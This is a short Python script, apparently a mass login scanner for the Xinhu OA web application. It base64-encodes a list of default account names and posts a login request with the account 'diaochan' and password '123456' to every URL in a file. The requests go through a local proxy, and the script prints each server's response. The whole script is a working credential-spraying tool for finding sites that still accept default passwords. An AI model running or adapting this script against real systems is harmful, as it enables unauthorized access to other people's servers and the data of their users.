import requests

import base64

username = ['rock','admin','diaochan','xiaoqiao','daqiao','zhangfei','zhaozl','xinhu']

username_b64 = {name:base64.b64encode(name.encode('utf-8')).decode()+':' for name in username}
print(username_b64)
header= {

    'Content-Type': 'application/x-www-form-urlencoded'
}

params = {
    'a': 'check',
    'm': 'login',
    'd': '',
    'ajaxbool': 'true',
    'rnd': '365342',
}


data = {
'rempass': '0',
'jmpass': 'false',
'device': '1721298388626',
'ltype': '0',
'adminuser': 'ZGlhb2NoYW4=:',
'adminpass': 'MTIzNDU2',
'yanzm': '',
}

for url in open('urls.txt','r').readlines():
    try:
        response = requests.post(url.strip(), params=params, headers=header,timeout=3, data=data,proxies={'http':'http://127.0.0.1:7890','https':'http://127.0.0.1:7890'})
        print("貂蝉",response.json())
    except:
        pass